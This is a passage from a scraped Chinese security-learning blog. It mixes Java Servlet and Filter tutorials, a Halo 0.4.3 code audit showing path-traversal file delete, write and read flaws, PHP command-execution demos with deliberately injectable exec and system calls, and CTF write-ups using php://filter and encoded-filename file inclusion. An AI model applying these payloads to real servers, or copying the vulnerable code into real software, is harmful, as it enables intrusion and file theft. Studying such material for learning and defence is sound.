\u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;com.test.Filters.Filter1\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.html\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 同时过滤多种类型资源 重点是filter-mapping\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;com.test.Filters.Filter1\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.html\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.jsp\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 过滤指定的目录 重点是url-pattern\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;com.test.Filters.Filter1\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/folder_name/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 过滤指定的Servlet 重点是filter-mapping中的servlet-name\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;com.test.Filters.Filter1\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;servlet-name\u0026gt;DisplayHeader\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;DisplayHeader\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.test.Servlets.DisplayHeader\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; 过滤指定文件 重点是url-pattern\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;com.test.Filters.Filter1\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/a.html\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; ## Filter应用场景 统一POST请求中文字符编码\n控制浏览器缓存页面中的静态资源\n1. 动态页面中引入一些图片orCSS（静态资源），为减轻服务器的压力，使用Filter控制浏览器缓存这些文件\n实现URL级别的权限认证 1. 将执行敏感操作的Servlet映射到一些特殊目录中，同时用Filter将这些目录保护起来，限制只有某些权限的用户才能访问，从而在系统中实现一种URL级别的权限功能。\n实现用户自动登录 1. 用户成功登录后发送名为user的COOKIE（值为用户名和md5后的密码）给客户端\n2. 用Filter检查用户是否带有该COOKIE\n1. 有，调用dao查询cookie的值和数据库是否匹配\n2. 匹配，则向session中存入user对象——登录标识，实现自动登录\n## 缺省Servlet URL绕过Filter 有点子看不懂原文在说个什么……\n在对资源使用Filter的时候，有两种方式来指定要应用的Filter：\n指定URL模式 - 这个模式必须和web.xml中的\u0026lt;servlet-mapping\u0026gt;元素定义的模式匹配\n指定Servlet名称 - 这个名称必须和web.xml中的\u0026lt;servlet\u0026gt;元素中定义的名称匹配\n但大多数服务器会使用一个激活器Servlet为Servlet提供一个默认的URL访问路径：\nhttp://host/WebAppPrefix/servlet/ServletName\n用户可以通过该URL直接访问Servlet，也就是绕开Filter\nListener 💡 实现特定接口的java程序again。Servlet的监听器，监听客户端的请求，服务端的操作等。\n一般给按钮增加监听器——点击按钮，触发一项监听事件\nListener类型 对Session类 - HttpSessionListener：监听Session的创建与销毁\n对Request类 - ServletReuqestListener：监听request的创建与销毁\n对Context类 - ServletContextListener：监听Context的创建与销毁\n这个只是一个笼统的例子（IDEA官方模板）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 package com.test.Listeners; import javax.servlet.*; import javax.servlet.http.*; import javax.servlet.annotation.*; @WebListener public class ListenerforServletContext implements ServletContextListener, HttpSessionListener, HttpSessionAttributeListener { public ListenerforServletContext() { } @Override public void contextInitialized(ServletContextEvent sce) { /* This method is called when the servlet context is initialized(when the Web application is deployed). */ System.out.println(\u0026#34;ServletContext对象创建\u0026#34;); } @Override public void contextDestroyed(ServletContextEvent sce) { /* This method is called when the servlet Context is undeployed or Application Server shuts down. */ System.out.println(\u0026#34;ServletContext对象销毁\u0026#34;); } @Override public void sessionCreated(HttpSessionEvent se) { /* Session is created. */ System.out.println(se.getSession() + \u0026#34;创建成功。\u0026#34;); } @Override public void sessionDestroyed(HttpSessionEvent se) { /* Session is destroyed. */ System.out.println(\u0026#34;Session销毁。\u0026#34;); } @Override public void attributeAdded(HttpSessionBindingEvent sbe) { /* This method is called when an attribute is added to a session. */ } @Override public void attributeRemoved(HttpSessionBindingEvent sbe) { /* This method is called when an attribute is removed from a session. */ } @Override public void attributeReplaced(HttpSessionBindingEvent sbe) { /* This method is called when an attribute is replaced in a session. */ } } 然后其他的配置： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 //web.xml \u0026lt;!-- 对ServletContext和Request的listener的注册 --\u0026gt; \u0026lt;listener\u0026gt; \u0026lt;listener-class\u0026gt;com.test.Listeners.ListenerforServletContext\u0026lt;/listener-class\u0026gt; \u0026lt;/listener\u0026gt; //web.xml文件中注册监听器 \u0026lt;!--注册针对HttpSession对象进行监听的监听器--\u0026gt; \u0026lt;listener\u0026gt; \u0026lt;description\u0026gt;HttpSessionListener监听器\u0026lt;/description\u0026gt; \u0026lt;listener-class\u0026gt;me.gacl.web.listener.MyHttpSessionListener\u0026lt;/listener-class\u0026gt; \u0026lt;/listener\u0026gt; \u0026lt;!-- 配置HttpSession对象的销毁时机 --\u0026gt; \u0026lt;session-config\u0026gt; \u0026lt;!--配置HttpSession对象的1分钟之后销毁 --\u0026gt; \u0026lt;session-timeout\u0026gt;1\u0026lt;/session-timeout\u0026gt; \u0026lt;/session-config\u0026gt; ``` ![Untitled](../post_3/S_L_Fpics/Untitled%205.png) \u0026lt;hr\u0026gt; ","date":"2024-05-10T11:33:55+08:00","permalink":"https://66lueflam144.github.io/p/3a26b5b/","title":"Servlet \u0026 Listener \u0026 Filter from JAVA"},{"content":"HALO 一个java博客系统，但funny problems everywhere\n看着怪像wordpress的。\n打开pom.xml，到处都是警告 我一定是和DOCKER有仇，所以只能打开linux虚拟机通过linux的docker进行搭建环境。\npom.xml 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;runtime\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 这个并没有见过，但看名字和数据库有关，于是搜索，结果为\nh2未授权访问漏洞\n看不懂思密达\n所以转向看controller\n任意文件删除 漏洞代码 删除备份\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 //BackupController.java @GetMapping(value = \u0026#34;delBackup\u0026#34;) @ResponseBody //fileName文件名，type备份类型 public JsonResult delBackup(@RequestParam(\u0026#34;fileName\u0026#34;) String fileName, @RequestParam(\u0026#34;type\u0026#34;) String type) { final String srcPath = System.getProperties().getProperty(\u0026#34;user.home\u0026#34;) + \u0026#34;/halo/backup/\u0026#34; + type + \u0026#34;/\u0026#34; + fileName; try { FileUtil.del(srcPath); return new JsonResult(ResultCodeEnum.SUCCESS.getCode(), localeMessageUtil.getMessage(\u0026#34;code.admin.common.delete-success\u0026#34;)); } catch (Exception e) { return new JsonResult(ResultCodeEnum.FAIL.getCode(), localeMessageUtil.getMessage(\u0026#34;code.admin.common.delete-failed\u0026#34;)); } } 理解逻辑就是：\n请求中有fileName和type，然后调用System.getProperties().getProperty(\u0026quot;user.home\u0026quot;)获取当前用户的主目录路径。（System.getProperties() 是一个方法，它返回一个 Properties 对象，该对象包含当前 Java 虚拟机的系统属性） 拼接之后得到srcPath， 进行删除，成功就返回消息，失败也但会消息。 vuln 在这里可能存在的问题就是，任意文件的删除。\n文件名可以进行抓包修改 修改目录路径，即使写入了指定路径，但是未进行后续的验证，所以修改路径is true 。后面会发现很多地方都是这样的错误。 一个验证实验\n1 2 PS C:\\Users\\won\\Downloads\u0026gt; cd D:\\sot\\..\\..\\ PS D:\\\u0026gt; 进行跨目录是可以实现的。（nothing special but for me）\nPage 对wordpress的认知里面（或者说是对博客系统的认知），有类似在page或者是post模板处的漏洞，所以继续翻翻。\n任意文件内容写入 漏洞代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 //ThemeController.java /** * 保存修改模板 * * @param tplName 模板名称 * @param tplContent 模板内容 * @return JsonResult */ @PostMapping(value = \u0026#34;/editor/save\u0026#34;) @ResponseBody //请求中参数有两个，一个tplName，一个tplContent public JsonResult saveTpl(@RequestParam(\u0026#34;tplName\u0026#34;) String tplName, @RequestParam(\u0026#34;tplContent\u0026#34;) String tplContent) { if (StrUtil.isBlank(tplContent)) { return new JsonResult(ResultCodeEnum.FAIL.getCode(), localeMessageUtil.getMessage(\u0026#34;code.admin.theme.edit.no-content\u0026#34;)); } try { //获取项目根路径 final File basePath = new File(ResourceUtils.getURL(\u0026#34;classpath:\u0026#34;).getPath()); //获取主题路径 final StrBuilder themePath = new StrBuilder(\u0026#34;templates/themes/\u0026#34;); themePath.append(BaseController.THEME); themePath.append(\u0026#34;/\u0026#34;); themePath.append(tplName); final File tplPath = new File(basePath.getAbsolutePath(), themePath.toString()); //用FileWriter写入tplContent //使用 FileWriter 对象写入内容，如果指定的文件路径不存在的话， FileWriter 会自动创建一个新的文件。 final FileWriter fileWriter = new FileWriter(tplPath); fileWriter.write(tplContent); } catch (Exception e) { log.error(\u0026#34;Template save failed: {}\u0026#34;, e.getMessage()); return new JsonResult(ResultCodeEnum.FAIL.getCode(), localeMessageUtil.getMessage(\u0026#34;code.admin.common.save-failed\u0026#34;)); } return new JsonResult(ResultCodeEnum.SUCCESS.getCode(), localeMessageUtil.getMessage(\u0026#34;code.admin.common.save-success\u0026#34;)); } vuln 对写入的内容即tplContent没有进行过滤，完全会写入危险的代码，比如反向shell代码。 而FileWriter的无中生有更是大大方便这种攻击。\n依旧是路径的问题，完全换一个地方写入都可以\n文件内容读取？ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @GetMapping(value = \u0026#34;/getTpl\u0026#34;, produces = \u0026#34;text/text;charset=UTF-8\u0026#34;) @ResponseBody public String getTplContent(@RequestParam(\u0026#34;tplName\u0026#34;) String tplName) { String tplContent = \u0026#34;\u0026#34;; try { //获取项目根路径 final File basePath = new File(ResourceUtils.getURL(\u0026#34;classpath:\u0026#34;).getPath()); //获取主题路径 final StrBuilder themePath = new StrBuilder(\u0026#34;templates/themes/\u0026#34;); themePath.append(BaseController.THEME); themePath.append(\u0026#34;/\u0026#34;); themePath.append(tplName); final File themesPath = new File(basePath.getAbsolutePath(), themePath.toString()); final FileReader fileReader = new FileReader(themesPath); tplContent = fileReader.readString(); } catch (Exception e) { log.error(\u0026#34;Get template file error: {}\u0026#34;, e.getMessage()); } return tplContent; } vuln 这个的问题根源就是对目录的不设限制。\nquestion 可以看到确实是根据指定目录进行实例化，为什么可以做到读取别的内容进行返回？\n答案，因为可以跨目录，指定目录只是说从哪里开始，但没有限制去哪里，所以可以。\n可以写一个demo进行测试理解。\n","date":"2024-03-31T20:29:51+08:00","image":"https://66lueflam144.github.io/vulnerable.png","permalink":"https://66lueflam144.github.io/p/5ff6fd0/","title":"Halo 0.4.3 审计ing"},{"content":"一点笔记\n命令执行(RCE) php命令执行原理 通过参数可控的命令执行函数进行命令执行\n相关函数 exec 写了一个简单的demo进行演示test\n1 2 3 4 5 6 7 8 9 10 11 12 //demo.php \u0026lt;?php $sys = $_REQUEST[\u0026#39;value\u0026#39;]; $cmd = exec($sys);//Linux用bash，Windows用cmd echo $cmd;//因为exec()函数没有回显，需要echo进行输出，并且只返回执行后的最后一行结果 ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Karina\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Cause I\u0026#39;m too spicy for your heart\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;welcome and here for your test.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 其实html可写可不写。\n当我构造payload为?value=whoami的时候，就会将电脑名+当前用户名返回。\n如果是\u0026gt;value=calc.exe，就会成功召唤计算器。\nshell_exec shell_exec()没有回显，用echo或者var_dump()进行返回，但这个函数返回所有内容——也是和exec()的区别所在。\n``其实就是调用shell_exec()函数，使用示例如下：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php \u0026amp;sys = $_REQUEST[\u0026#39;value\u0026#39;]; $cmd = `$sys`; echo $cmd; ?\u0026gt; system \u0026amp; passthru 均将输入的参数当作命令执行，且回显所有内容\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php \u0026amp;sys = $_REQUEST[\u0026#39;value\u0026#39;]; $cmd = system($sys); //$cmd = passthru($sys); ?\u0026gt; popen \u0026amp; proc_open popen()通常用于打开进程文件指针，但如果传入的参数可控，也能进行无回显命令执行\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php \u0026amp;sys = $_REQUEST[\u0026#39;value\u0026#39;]; $cmd = popen($sys,\u0026#39;r\u0026#39;); echo $cmd; var_dump($cmd); ?\u0026gt; 返回结果是文件指针，即：\n1 2 Resource id #2resource(2) of type (stream) 第一个resource是echo的回显，第二个resource是var_dump的回显。\nproc_open()，执行一个命令并且打开用来输入或输出的文件指针，与popen()类似但是参数更多，处理数据努力更强。\npcntl_exec pcntl_exec()在当前进程空间执行指定程序，PHP version \u0026gt;=4.2.0\n由于其执行命令是没有回显的，所以其常与python结合来反弹shell，或是绕过disable_functions\n一个参考\n两个参考\n管道符 |：直接执行后面语句，A|B，执行B\n||：如果前面语句执行错误，才执行后面语句\n\u0026amp;：均执行\n\u0026amp;\u0026amp;：如果前面语句执行错误则后面也不执行，只有前面执行成功才执行后面\n;：only for Linux的一个，前面执行完，继续执行后面。\n代码执行 需要分清楚命令执行与代码执行的区别与联系。\n代码执行\u0026ndash;通过代码调用函数直接调用PHP中任意代码进行执行。\nfunny thing is ：代码执行可以通过调用命令执行的函数来执行系统命令，来达到控制后台甚至服务器——达成RCE。\n相关函数 eval() \u0026amp; assert() preg_replace() create_function() array_map() call_user_func() \u0026amp; call_user_func_array() array_filter() \u0026amp; array_walk() ob_start() usort() 番外 用dirmap和dirsearch又扫描了一下这个为测试用而搭建的本地网站，结果dirsearch还在努力着，dirmap已经把所有文件都告诉我了。。。下一步思考怎么设置文件禁止访问。\n","date":"2023-11-10T18:17:45+08:00","permalink":"https://66lueflam144.github.io/p/f357208/","title":"PHP 命令和代码执行"},{"content":"What is it 网络资产测绘，用一些技术方法，探测全球互联网空间上的节点分布情况和网络关系索引，构建全球互联网图谱的一种方法。\n资产 网络资产，指赛博空间中某机构所拥有的一切可能被潜在攻击者利用的设备、信息、应用等数字资产。具体包括但不限于硬件设备、云主机、操作系统、IP地址、端口、证书、域名、Web应用、业务应用、中间件、框架、机构公众号、小程序、App、API、源代码等。概括来说，只要是可操作的对象，不管是实体还是属性。都可以称之为“网络空间资产”。\n网络资产在协议实现、网络应用等方面存在差异，如开放的端口/服务信息、banner信息、Web网页数据等，对这些差异进行特征提取可得到该资产的特征指纹，网络资产指纹库积累了大量网络资产指纹。资产指纹比对是将目标主机的特征指纹和指纹库进行匹配，从而实现资产属性识别。\n指纹特征 机构中某个资产具有的一系列特征信息的集合构成了这个资产的指纹特征——外网IP地址、内网IP地址、端口号、证书、域名、操作系统、Web应用、中间件/框架\n资产扫描和发现不等同于网络空间测绘，我们可以从字面上去做个简单拆解，可以把资产扫描和发现理解为“测”的一部分，那么我们还需要去“绘”,也就是说要去分析数据、解读数据,进而去找到网络空间与现实物理空间存在着多种映射关联，并描述出来。\n测绘概念 行为测绘\n动态测绘\n交叉测绘\n行为测绘 对不同的banner特征进行识别\n动态测绘 周期性对某个资产进行扫描，动态掌握周期内新增资产的情况\n网络空间资产是随时间变化而不断变化的，在这个角度上来看资产扫描与发现很多时候只是某些单一时间点的任务，而资产测绘的探测扫描则是持续的，通过网络资产的动态变化，反映现实空间的变化。\n交叉测绘 IPv4与IPv6的交叉\n网络资产识别 设备组件识别\n应用组件识别\n业务类型推断\n|name|description|more|\n|\u0026mdash;|\u0026mdash;|\u0026mdash;|\n|设备组件识别|获取资产的网站响应头部数据、网站文件类型、网站异常响应、服务端口、banner等数据，提取设备指纹，通过与网络设备组件指纹库进行指纹比对，识别目标主机的设备类型、设备厂商、设备品牌、设备型号等设备属性。||\n|应用组件识别|通过持续收集、解析目标网络的应用组件信息，如论坛程序、博客程序等，获取网站响应头部数据、HTML页面、特殊URL、开放的端口、banner等，生成应用指纹，通过比对网络应用组件指纹库来自动化识别目标主机的Web服务器软件、Web脚本语言、服务类型及相应版本型号等应用属性。||\n|业务类型推断|基于资产探测数据，深入融合DNS信息、漏洞库、IP地理信息库等资源，建立资产多层级关联模型，推断网络资产的业务类型，实现网络资产多维度画像。业务类型推断旨在识别重要行业的重要资产，是网络空间深入态势感知的核心环节。||\n平台 FOFA\nZoomEye\n参考 gov description\nseebug 网络空间测绘溯源技术剖析\nCAM\n对话\ncyberspace\n\u0026lt;a href=https://www.anquanke.com/table/topic.html?id=1\u0026gt;一些talk\n","date":"2023-11-07T18:28:59+08:00","permalink":"https://66lueflam144.github.io/p/3977d43/","title":"Net"},{"content":"?file=xxx 用burp suite读取到（其实直接看URL也能看到，本题属于hackbar都不用的）：\n1 2 GET /?file=flag.php HTTP/1.1 =php://filter 1.php://filter 可以获取指定文件源码，php://filter与包含函数结合时，php://filter流会被当作php文件执行。 所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。\n2.php://filter伪协议文件包含读取源代码，加上(read=)convert.base64-encode，（那个read=本题可以不用添加），用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。 payload 1 2 http://xxx.com/?file=php://filter/convert.base64-encode/resource=flag.php 得到PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MDc1MmI3NDYtZWI2Yi00NjZkLWE4MWMtNGYzZTdhYWNjYzQ3fQo=\n因为是经过base64编码后输出的结果，所以进行base64解码后可以得到：\n1 2 3 4 5 6 \u0026lt;?php echo \u0026#34;Can you find out the flag?\u0026#34;; //flag{0752b746-eb6b-466d-a81c-4f3e7aaccc47} 也就得到了flag。\n","date":"2023-11-06T12:53:29+08:00","permalink":"https://66lueflam144.github.io/p/85d9197/","title":"ACTF 2020 Include"},{"content":"最近在随机学学，然后感觉这个挺有趣的就学着写写。\nServlet 运行在web服务器上或应用服务器上的程序，作为来自Web浏览器或者其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。\n从代码上来说，Servlet属于Java类，服务于HTTP请求并实现了javax.servlet.Servlet接口。\n一个Servlet生命周期：\ninit()\nservice() ：服务阶段，主要处理来自客户端的请求，并可以根据HTTP请求类型来调用对应的方法，比如下面的两个\ndoGet()，doPost() ：处理阶段，将主要代码逻辑写在这里，根据不同请求对应不同方法。\ndestroy()\nFirst Servlet 创建第一个Servlet by maven.\nIDEA 用的是\n用IDEA的Maven archetype来创建。\n如图所示：\nname什么的自己随心情写。\nJDK建议1.8或者16（反正找点能跑的，不然就会和我一样为JDK19换来一句“Java 错误：不支持发行版本 5”）（JDK 8 好像也要自己找。）\nArchetype选 webapp\nversion是自动的，不用管。\n其他的默认，create就行。\nSetting create之后稍微等一下它初始化，然后就可以看到项目文件夹下有.idea，src等文件夹以及文件。\n在src/main目录下创建new Directory，命名一下。（我直接写java）\n然后在java里面创建class，（mine：FirstServlet）对其进行编写：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 import javax.servlet.ServletException; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpServlet; import java.io.IOException; import java.io.PrintWriter; public class FirstServlet extends HttpServlet{ @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.setContentType(\u0026#34;text/html\u0026#34;); PrintWriter out = resp.getWriter(); out.print(\u0026#34;\u0026lt;h1\u0026gt;blue blood.\u0026lt;/h1\u0026gt;\u0026#34;);//记住这个，成功创建界面应该是看见这行字。内容可以自己写。 } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { doGet(req, resp); } } 目录里面有个pom.xml，打开并添加配置：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.servlet-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;compile\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; tomcat 如果没下载请去下载\n版本随意，但选择core下的。\n对tomcat进行配置：\n在IDEA界面右上角那个绿色锤子和绿色三角形之间，一个current file，点击之后会有一个edit configurations,点进去，add new，下拉选择Tomcat Local。\nDeployment界面点击右下角fix，二选一建议二。\n回到Server界面可以看到URL跟着变了。\nApply then ok\n就会看到\n我这个是运行过的所以有个Finished。\n到这里已经成功80%。\n接下来是对来自于根目录下方webapp/WEB-INF的web.xml的配置，把servlet写进去，进行注册：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;FirstServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;FirstServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;FirstServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/FirstServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 映射匹配流程：/FirstServlet路径绑定的servlet-name为FirstServlet，而FirstServlet绑定的class是FirstServlet，最终访问/FirstServlet，调用类也是FirstServlet.class\n对于以上解释，需要注意的是：\n这个类也就是class，名字是自己写的\nurl-pattern这里可以填其他的，感觉看的这个博客的作者是故意想绕死初学者。才一堆重名。当然也可能是ctrl c + ctrl v比较方便。\nstart 如果到这里，直接启动是可以的，不过你看到的界面是那个index.jsp的内容——一个Hello World。按理说，我们应该看见blue blood才对。\n这是因为在tomcat的配置中，那个URL是访问默认页面的，在这里就是index.jsp。\n修改的方法有两种（但本质是一种）：\n1.可以在当前运行的local page上添加刚才写的url-pattern的内容。我这里就是http://localhost:8080/ServletDemo2_war/FirstServlet\n2.右击左下角的你的tomcat选择edit configuration，在URL处修改成http://localhost:8080/ServletDemo2_war/FirstServlet就行了。记得apply再ok，重启服务即可。\nFilter Servlet中的过滤器，主要用于过滤字符编码，防止XSS，SQL injection，file upload等。\n配置其即可获得统一过滤危险字符，比自己去写白名单、黑名单方便很多。\n又来创建了 过滤器基于javax.servlet.Filter接口进行实现的，需要使用doFilter()方法实现拦截。\n编写 以servlet为基础进行编写：\nmain/java/中new package，创建个新filter，再建个new class FilterTest。（这里有趣的是，我最开始没注意到是要建一个filter，直接建了一个com.test.filterpackage，在里面建了一个类，但是也成功了。） 对类进行编写：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package com.test.filter; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; public class FilterTest implements Filter { @Override public void destroy(){ } @Override public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { HttpServletRequest request = (HttpServletRequest) req; HttpServletResponse response = (HttpServletResponse) resp; String requestURI = request.getRequestURI(); if (requestURI.contains(\u0026#34;/FirstServlet\u0026#34;)){ chain.doFilter(request, response); } else { request.getRequestDispatcher(\u0026#34;/\u0026#34;).forward(request, response); } } @Override public void init(FilterConfig config) throws ServletException { } } 重写了doFilter()方法\n通过String requestURI = request.getRequestURI();获取URL路径，然后进行判断\n如果路径中包含/FirstServlet，就放行，否则转到根目录下。\n最后注册 也是在pom.xml里面写入：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;com.test.filter.FilterTest\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 过滤器标签需要在Servlet标签之上。程序会按照注册顺序进行执行。\n然后你再次启动，当你把http://localhost:8080/ServletDemo2_war/FirstServlet改成http://localhost:8080/ServletDemo2_war/Fi或者http://localhost:8080/ServletDemo2_war/hello，都会回到index.jsp的\nHello World","date":"2023-11-03T13:26:58+08:00","permalink":"https://66lueflam144.github.io/p/7cba448/","title":"Java Path"},{"content":"一个比较有趣的题目\n打开抓包的时候那个cmd=过于耀眼，所以尝试了cmd=dir，不过都没有什么，结果倒是多打了一个;得到forbid的响应。旁边响应还有一个耀眼的base64。后面那串应该就是Base64编码过的。\nbase64\u0026amp;hex 1 2 GET /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026amp;cmd= HTTP/1.1 进行那段看似乱码的字符串的解码。一个个尝试下了，base64\nTXpVek5UTTFNbVUzTURabE5qYz0-\u0026gt;MzUzNTM1MmU3MDZlNjc=-\u0026gt;3535352e706e67\n再通过HEX解码得到555.png。\n访问该图片，发现就是那个熊猫哭泣图。\n所以回到之前那个Base64编码过的很长的“乱码”——就是这个图片的内容。\n可能存在文件包含漏洞。\n按照找个555.png的编码模式对index.php进行编码，也就是先HEX再两次Base64。不过翻到官方文档使用了python进行编码，觉得很有意思：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import binascii import base64 filename = input().encode(encoding=\u0026#39;utf-8\u0026#39;) hex = binascii.b2a_hex(filename) base1 = base64.b64encode(hex) base2 = base64.b64encode(base1) print(base2.decode()) 编码结果为TmprMlpUWTBOalUzT0RKbE56QTJPRGN3,再次发送，就会得到index.php内容经过base64编码后的内容，解码一下就行了\nCrack form MD5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 //index.php \u0026lt;?php error_reporting(E_ALL || ~ E_NOTICE);//将所有错误和警告都输出，忽略NOTICE级别错误。 header(\u0026#39;content-type:text/html;charset=utf-8\u0026#39;); $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!isset($_GET[\u0026#39;img\u0026#39;]) || !isset($_GET[\u0026#39;cmd\u0026#39;]))//检查是否存在img和cmd参数 header(\u0026#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026amp;cmd=\u0026#39;);//不存在就重定向到该页面 $file = 